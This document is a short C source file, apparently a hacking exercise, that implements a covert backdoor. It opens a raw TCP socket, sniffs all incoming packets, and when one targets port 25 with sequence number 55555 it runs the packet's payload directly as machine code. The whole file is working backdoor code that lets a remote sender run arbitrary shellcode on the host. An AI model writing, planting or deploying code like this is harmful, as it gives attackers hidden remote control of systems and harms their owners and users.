#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>

#include "hacking.h"

int setup_socket()
{
    int sockfd;
    return sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
}

int execute(u_char *code)
{
    int val = 0;
    int (*func)() = (int(*)())code;
    func();
    return 0;
}

void parse_packet(u_char *buf, int len)
{
    struct iphdr *packet;
    struct tcphdr *tcp;
    u_char *raw_data = NULL;
    struct sockaddr_in *src, *dst;
    src = malloc(sizeof(struct sockaddr_in));
    dst = malloc(sizeof(struct sockaddr_in));
    memset(src, '\0', sizeof(struct sockaddr_in));
    memset(dst, '\0', sizeof(struct sockaddr_in));
    
    packet = (struct iphdr*)buf;
    tcp = (struct tcphdr*)(buf + sizeof(struct iphdr));
    raw_data = (u_char*)(buf + sizeof(struct iphdr) + sizeof(struct tcphdr));
    src->sin_addr.s_addr = packet->saddr;
    dst->sin_addr.s_addr = packet->daddr;
    src->sin_port = ntohs(tcp->th_sport);
    dst->sin_port = ntohs(tcp->th_dport);
    
    if ((dst->sin_port == 25) && (ntohl(tcp->th_seq) == 55555))
    {
	if (raw_data && strlen(raw_data) > 0)
	    execute(raw_data);
    }
    free(src);
    free(dst);
    return;
}

void sniff(int sockfd)
{
    int recv_length, i;
    u_char buffer[9000];
    memset(buffer, '\0', 9000);
    
    recv_length = 1;
    while (recv_length > 0)
    {
	recv_length = recv(sockfd, buffer, 8000, 0);
	parse_packet(buffer, recv_length);
	memset(buffer, '\0', 9000);
    }
}


int main(void)
{
    int sockfd;
    sockfd = setup_socket();
    if (sockfd != -1)
	sniff(sockfd);
}
